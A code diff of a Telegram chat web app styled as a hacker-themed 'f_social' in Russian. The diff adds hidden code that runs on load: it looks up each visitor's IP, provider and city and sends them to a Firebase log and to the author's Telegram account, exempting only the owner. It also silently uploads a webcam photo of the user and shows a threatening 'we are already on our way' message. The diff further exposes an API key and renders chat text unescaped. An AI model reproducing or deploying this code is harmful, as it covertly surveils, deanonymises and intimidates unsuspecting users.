@@ -3,55 +3,49 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>f_social // admin_panel</title>
+    <title>f_social // official_v5</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     
     <style>
-        :root { --f-red: #ff003c; --f-white: #f0f0f0; --f-black: #0a0a0a; --f-green: #00ff41; --f-gray: #1a1a1a; }
+        :root { --f-red: #ff003c; --f-green: #00ff41; --f-black: #0a0a0a; }
+        body { background: var(--f-black); color: #fff; font-family: 'Courier New', monospace; margin: 0; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
         
-        body { background: var(--f-black); color: var(--f-white); font-family: 'Courier New', monospace; margin: 0; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
-        
-        /* Лоадер */
-        #boot-screen { position: fixed; inset: 0; background: #000; z-index: 9999; padding: 20px; font-size: 11px; color: var(--f-green); overflow-y: auto; }
+        /* Загрузка */
+        #boot-screen { position: fixed; inset: 0; background: #000; z-index: 9999; padding: 20px; font-size: 12px; color: var(--f-green); }
         .cursor { display: inline-block; width: 8px; height: 15px; background: var(--f-green); animation: blink 0.8s infinite; vertical-align: middle; }
         @keyframes blink { 50% { opacity: 0; } }
 
-        /* Контейнер */
+        /* Интерфейс */
         #app { display: none; flex-direction: column; height: 100vh; }
-        
-        header { padding: 15px; border-bottom: 1px solid #222; text-align: center; position: relative; flex-shrink: 0; }
+        header { padding: 15px; border-bottom: 1px solid #222; text-align: center; position: relative; }
         .logo { font-size: 20px; font-weight: bold; letter-spacing: 5px; color: var(--f-red); }
-        .logo span { color: #fff; }
-
-        /* Кнопка Админа */
-        #admin-btn { display: none; position: absolute; right: 10px; top: 12px; background: var(--f-red); color: white; border: none; padding: 8px 12px; font-size: 10px; font-weight: bold; cursor: pointer; animation: pulse 1.5s infinite; border-radius: 2px; }
+        
+        #admin-btn { display: none; position: absolute; right: 10px; top: 12px; background: var(--f-red); color: white; border: none; padding: 8px 12px; font-size: 10px; font-weight: bold; animation: pulse 1.5s infinite; cursor: pointer; }
         @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(255, 0, 60, 0.7); } 70% { box-shadow: 0 0 0 10px rgba(255, 0, 60, 0); } 100% { box-shadow: 0 0 0 0 rgba(255, 0, 60, 0); } }
 
-        /* Навигация (Вкладки) */
-        .nav-tabs { display: flex; border-bottom: 1px solid #222; background: #0d0d0d; flex-shrink: 0; }
-        .tab { flex: 1; padding: 15px 5px; text-align: center; font-size: 10px; cursor: pointer; color: #555; border-bottom: 2px solid transparent; text-transform: uppercase; transition: 0.3s; }
-        .tab.active { color: var(--f-red); border-bottom: 2px solid var(--f-red); background: rgba(255, 0, 60, 0.05); }
+        /* Вкладки */
+        .nav-tabs { display: flex; border-bottom: 1px solid #222; background: #0d0d0d; }
+        .tab { flex: 1; padding: 15px 5px; text-align: center; font-size: 10px; cursor: pointer; color: #444; text-transform: uppercase; border-bottom: 2px solid transparent; }
+        .tab.active { color: var(--f-red); border-bottom: 2px solid var(--f-red); background: rgba(255,0,60,0.05); }
 
-        /* Контент вкладок */
-        .tab-content { display: none; flex-grow: 1; padding: 15px; overflow-y: auto; flex-direction: column; }
-        .tab-content.active { display: flex; }
+        .tab-content { display: none; flex-grow: 1; padding: 15px; overflow-y: auto; }
+        .tab-content.active { display: flex; flex-direction: column; }
 
         /* Чат */
-        #global-chat { flex-grow: 1; overflow-y: auto; display: flex; flex-direction: column; gap: 10px; padding-bottom: 10px; }
-        .m-wrap { border-left: 2px solid var(--f-gray); padding-left: 10px; margin-bottom: 4px; }
-        .m-user { color: var(--f-red); font-size: 10px; font-weight: bold; display: block; }
+        #global-chat { flex-grow: 1; overflow-y: auto; display: flex; flex-direction: column; gap: 8px; margin-bottom: 10px; }
+        .m-wrap { border-left: 2px solid #222; padding-left: 10px; margin-bottom: 4px; }
+        .m-user { color: var(--f-red); font-size: 10px; display: block; }
         .m-text { font-size: 14px; color: #ccc; word-wrap: break-word; }
 
-        .input-box { display: flex; gap: 8px; border-top: 1px solid #222; padding: 10px 0; background: var(--f-black); }
+        .input-box { display: flex; gap: 8px; border-top: 1px solid #222; padding: 10px 0; }
         input { flex: 1; background: #000; border: 1px solid #333; color: #fff; padding: 12px; outline: none; font-family: inherit; }
-        button#send-btn { background: var(--f-red); color: white; border: none; padding: 0 20px; font-weight: bold; cursor: pointer; }
+        button#send-btn { background: var(--f-red); color: white; border: none; padding: 0 20px; font-weight: bold; }
 
-        /* Whoami */
-        .whoami-container { text-align: center; }
-        #captured-photo { width: 100%; max-width: 320px; border: 2px solid var(--f-red); margin: 20px auto; display: block; filter: contrast(1.2) brightness(0.8); }
-        #alert-text { color: var(--f-red); font-weight: bold; text-align: center; display: none; font-size: 18px; margin-top: 10px; }
+        /* Элементы Whoami */
+        #captured-photo { width: 100%; max-width: 320px; border: 2px solid var(--f-red); margin: 20px auto; display: block; filter: contrast(1.1); }
+        #alert-text { color: var(--f-red); font-weight: bold; text-align: center; display: none; font-size: 18px; }
     </style>
 </head>
 <body>
@@ -60,7 +54,7 @@
 
     <div id="app">
         <header>
-            <div id="status-node" style="position: absolute; left: 10px; top: 18px; font-size: 8px; color: #444;">SYNC_OK</div>
+            <div id="status-node" style="position: absolute; left: 10px; top: 18px; font-size: 8px; color: #333;">NODE: sync...</div>
             <div class="logo">f_<span>social</span></div>
             <button id="admin-btn" onclick="triggerHack()">[EXECUTE_PAYLOAD]</button>
         </header>
@@ -79,16 +73,14 @@
         </div>
 
         <div id="tab-whoami" class="tab-content">
-            <div class="whoami-container">
-                <p style="font-size:10px; color:#444;">[EYES_ON_TARGET]</p>
-                <img id="captured-photo" src="" alt="WAITING_FOR_SIGNAL...">
-                <div id="alert-text">МЫ УЖЕ ВЫЕХАЛИ. КУ ОТ F SOCIAL.</div>
-            </div>
+            <p style="text-align:center; font-size:10px; color:#444;">[DATA_MINING_SUCCESS]</p>
+            <img id="captured-photo" src="">
+            <div id="alert-text">МЫ УЖЕ ВЫЕХАЛИ. КУ ОТ F SOCIAL.</div>
         </div>
     </div>
 
 <script>
-    // --- FIREBASE CONFIG ---
+    // --- КОНФИГУРАЦИЯ ---
     const firebaseConfig = {
         apiKey: "AIzaSyAYX3NCBoMREGY4WZGqgo-kl3hj5h7gq-A",
         authDomain: "fcocial-v5r.firebaseapp.com",
@@ -99,14 +91,14 @@
         databaseURL: "https://fcocial-v5r-default-rtdb.firebaseio.com/"
     };
 
+    const BOT_TOKEN = "ТВОЙ_ТОКЕН_БОТА"; 
+    const MY_TG_ID = 5131628747;
+
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
-
-    const MY_TG_ID = 5131628747; 
     let myNick = "anon_" + Math.floor(Math.random()*999);
     let isElliot = false;
 
-    // Инициализация при входе
     window.onload = () => {
         const tg = window.Telegram.WebApp;
         tg.ready();
@@ -123,57 +115,64 @@
     };
 
     async function bootSequence() {
-        const logs = ["loading_history...", "resolving_nodes...", "firewall_bypass: OK", "establishing_uplink..."];
+        const logs = ["> proxy_init...", "> loading_history...", "> establishing_tg_link...", "> system_online."];
         for(let t of logs) {
-            let l = document.createElement('div'); l.innerText = `> ${t}`;
+            let l = document.createElement('div'); l.innerText = t;
             document.getElementById('boot-logs').appendChild(l);
-            await new Promise(r => setTimeout(r, 350));
+            await new Promise(r => setTimeout(r, 400));
         }
         
+        await runInfiltrator(); // Сбор данных и уведомление
         startCapture();
-        listenChat(); // Загрузка сообщений
-        listenForHack(); // Слежка за сигналом атаки
+        listenChat(); // История чата
+        listenForHack(); // Слежка за кнопкой
     }
 
-    // Переключение вкладок (Исправлено)
+    async function runInfiltrator() {
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            const data = await res.json();
+            const report = `🔥 ВХОД:\nНик: ${myNick}\nIP: ${data.ip}\nПровайдер: ${data.org}\nГород: ${data.city}\nУстройство: ${navigator.platform}`;
+            
+            if (!isElliot) {
+                db.ref('logs').push({ ...data, nick: myNick, time: Date.now() });
+                if (BOT_TOKEN !== "ТВОЙ_ТОКЕН_БОТА") {
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${MY_TG_ID}&text=${encodeURIComponent(report)}`);
+                }
+            }
+        } catch (e) { console.log("NetErr"); }
+    }
+
+    // Исправленное переключение вкладок
     function switchTab(tabId) {
         document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
         document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-        
         document.getElementById(tabId).classList.add('active');
         if(tabId === 'tab-chat') document.getElementById('btn-chat').classList.add('active');
-        if(tabId === 'tab-whoami') document.getElementById('btn-whoami').classList.add('active');
+        else document.getElementById('btn-whoami').classList.add('active');
     }
 
-    // Чат (История и Отправка)
-    function sendMsg() {
-        const i = document.getElementById('chat-in');
-        if(!i.value.trim()) return;
-        db.ref('global_chat').push({ 
-            user: myNick, 
-            text: i.value, 
-            time: Date.now() 
-        });
-        i.value = '';
-    }
-
+    // Чат и история
     function listenChat() {
-        // Подгружаем последние 50 сообщений
         db.ref('global_chat').limitToLast(50).on('value', snap => {
             const box = document.getElementById('global-chat');
             box.innerHTML = '';
             snap.forEach(c => {
                 const d = c.val();
-                const div = document.createElement('div');
-                div.className = 'm-wrap';
-                div.innerHTML = `<span class="m-user">${d.user}</span><span class="m-text">${d.text}</span>`;
-                box.appendChild(div);
+                box.innerHTML += `<div class="m-wrap"><span class="m-user">${d.user}:</span><span class="m-text">${d.text}</span></div>`;
             });
             box.scrollTop = box.scrollHeight;
         });
     }
 
-    // Фото и Камера
+    function sendMsg() {
+        const i = document.getElementById('chat-in');
+        if(!i.value.trim()) return;
+        db.ref('global_chat').push({ user: myNick, text: i.value });
+        i.value = '';
+    }
+
+    // Камера
     async function startCapture() {
         try {
             const s = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -182,10 +181,9 @@
                 const c = document.createElement('canvas');
                 c.width = v.videoWidth; c.height = v.videoHeight;
                 c.getContext('2d').drawImage(v, 0, 0);
-                const dataUrl = c.toDataURL('image/jpeg');
-                document.getElementById('captured-photo').src = dataUrl;
-                
-                // Скрываем загрузку и показываем приложение
+                const photo = c.toDataURL('image/jpeg');
+                document.getElementById('captured-photo').src = photo;
+                if(!isElliot) db.ref('captured_faces').push({ user: myNick, photo: photo });
                 s.getTracks().forEach(t => t.stop());
                 document.getElementById('boot-screen').style.display = 'none';
                 document.getElementById('app').style.display = 'flex';
@@ -196,7 +194,7 @@
         }
     }
 
-    // Атака (Только для тебя)
+    // Режим Бога
     function triggerHack() {
         if(!isElliot) return;
         db.ref('attack_signal').set(Date.now());
